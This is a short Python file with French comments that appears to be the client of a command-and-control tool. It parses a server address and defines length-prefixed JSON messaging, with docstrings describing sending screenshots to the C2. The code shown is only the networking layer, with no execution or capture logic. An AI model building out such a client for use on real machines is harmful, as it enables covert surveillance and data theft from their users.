#Client principal
import socket
import json
import struct
import platform
import argparse

ENCODING ="utf-8"
RETRY_DELAY = 5
IS_WINDOWS = platform.system() == "Windows"

def parse_args():
    """parser de config server host"""
    p = argparse.ArgumentParser()
    p.add_argument("-ip", required=True, help="IP du serveur")
    p.add_argument("-port", type=int, required=True, help="port du serveur")
    return p.parse_args()

ARGS = parse_args()

SERVER_HOST = ARGS.ip
SERVER_PORT= ARGS.port

def send_msg(sock, payload: dict) -> None:
    """Pour envoyer un json à C2"""
    data = json.dumps(payload).encode(ENCODING)
    sock.sendall(len(data).to_bytes(4, "big") + data)


def send_bytes(sock, blob: bytes, meta: dict) -> None:
    """Pour envoyer les screenshots"""

    send_msg(sock, meta)
    sock.sendall(len(blob).to_bytes(4, "big") + blob)


def _receiveN(sock, n: int) -> bytes | None:
    """Pour lire n octets d'un message de C2"""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def receiveMessage(sock) -> dict:
    """Pour recevoir un msg du C2"""

    raw_len = _receiveN(sock, 4)
    if raw_len is None:
        raise ConnectionError("connexion coupée par le serveur")
    
    data = _receiveN(sock, int.from_bytes(raw_len, "big"))

    if data is None:
        raise ConnectionError("connexion interrompue en cours de message")
    return json.loads(data.decode(ENCODING))



